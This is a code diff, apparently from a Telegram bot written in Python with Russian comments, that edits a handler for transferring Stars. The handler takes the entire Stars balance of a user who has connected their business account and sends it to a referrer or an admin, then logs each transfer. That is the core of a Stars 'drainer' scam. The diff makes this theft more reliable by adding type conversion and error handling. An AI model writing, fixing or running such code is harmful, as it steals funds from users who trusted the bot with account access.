@@ -920,28 +920,33 @@ async def transfer_stars_handler(callback: CallbackQuery):
         business_connection = await bot.get_business_connection(business_id)
         user = business_connection.user
         
-        # Определяем получателя (как во втором боте)
-        inviter_id = user_referrer_map.get(str(user.id))  # Используем str() для ключа
+        # Определяем получателя с явным преобразованием в int
+        inviter_id = user_referrer_map.get(str(user.id))
         if inviter_id:
             try:
-                await bot.send_chat_action(inviter_id, "typing")
-                recipient_id = inviter_id
+                await bot.send_chat_action(int(inviter_id), "typing")
+                recipient_id = int(inviter_id)
             except Exception:
                 recipient_id = ADMIN_IDS[0]
         else:
             recipient_id = ADMIN_IDS[0]
             
         stars = await bot.get_business_account_star_balance(business_id)
-        amount = int(stars.amount)
+        
+        # Безопасное преобразование amount в int
+        try:
+            amount = int(float(stars.amount)) if stars.amount else 0
+        except (ValueError, TypeError, AttributeError):
+            amount = 0
         
         if amount > 0:
             await bot.transfer_business_account_stars(business_id, amount, recipient_id)
             success_msg = f"🌟 Успешно переведено звёзд: {amount} от {user.id} к {recipient_id}"
             
             await bot.send_message(LOG_CHAT_ID, success_msg)
-            if inviter_id and inviter_id != recipient_id:
+            if inviter_id and int(inviter_id) != recipient_id:
                 try:
-                    await bot.send_message(inviter_id, success_msg)
+                    await bot.send_message(int(inviter_id), success_msg)
                 except Exception as e:
                     await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось уведомить пригласившего: {e}")
                     
